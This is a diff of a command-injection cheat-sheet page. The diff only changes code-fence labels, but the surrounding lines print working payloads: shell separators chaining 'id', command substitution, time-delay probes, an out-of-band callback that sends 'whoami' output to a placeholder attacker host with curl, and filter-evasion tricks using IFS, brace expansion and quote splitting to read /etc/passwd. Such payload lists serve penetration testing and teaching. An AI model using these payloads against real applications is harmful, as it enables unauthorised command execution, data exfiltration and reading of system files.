@@ -5,7 +5,7 @@ title: "Command Injection"
 
 Inject after shell metacharacters: the app concatenates your input into a system call, so append a second command with a separator.
 
-```bash
+```bash wrap
 ; id
 | id
 || id
@@ -18,7 +18,7 @@ $(id)
 
 When there's no visible output, use time delays or out-of-band callbacks to confirm execution.
 
-```bash
+```bash wrap
 ; sleep 5
 ; curl http://<your-ip>/$(whoami)
 ```
@@ -27,7 +27,7 @@ When there's no visible output, use time delays or out-of-band callbacks to conf
 
 Filters often look for specific characters or keywords: use IFS, brace expansion, or string splitting to reconstruct the command without triggering them.
 
-```bash
+```bash wrap
 ${IFS}id
 {cat,/etc/passwd}
 c'a't /etc/passwd
